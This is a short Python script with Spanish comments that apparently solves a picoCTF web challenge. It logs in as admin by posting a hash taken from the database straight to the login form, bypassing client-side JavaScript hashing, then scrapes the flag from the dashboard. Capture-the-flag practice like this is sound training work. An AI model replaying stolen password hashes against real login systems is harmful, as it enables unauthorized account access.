import requests

# IMPORTANTE: Reemplazá con tu IP y puerto actuales
BASE_URL = "http://lonely-island.picoctf.net:49195"
LOGIN_URL = f"{BASE_URL}/login.php"
DASHBOARD_URL = f"{BASE_URL}/index.php"

def solve():
    s = requests.Session()
    
    # El hash del admin que robamos de la base de datos
    payload = {
        "username": "admin",
        "password": "5a9a79d9fa477ed163b89088681672c9"
    }
    
    print("[*] Puenteando el JavaScript y enviando el hash crudo al servidor...")
    # Enviamos los datos como un formulario estándar (data=)
    res_login = s.post(LOGIN_URL, data=payload)
    
    print("[*] Redirigiendo al panel de búsqueda principal...")
    # Ahora que la sesión debería estar validada, pedimos la página del buscador
    res_index = s.get(DASHBOARD_URL)
    
    # Buscamos la bandera oculta en el HTML
    if "picoCTF{" in res_index.text:
        print("\n[+] ¡ACCESO DE ADMINISTRADOR CONCEDIDO!")
        start = res_index.text.find("picoCTF{")
        end = res_index.text.find("}", start) + 1
        print(f"[🏆] FLAG: {res_index.text[start:end]}")
    else:
        print("\n[-] Falló el login. Es posible que los parámetros no se llamen 'username' y 'password'.")

if __name__ == "__main__":
    solve()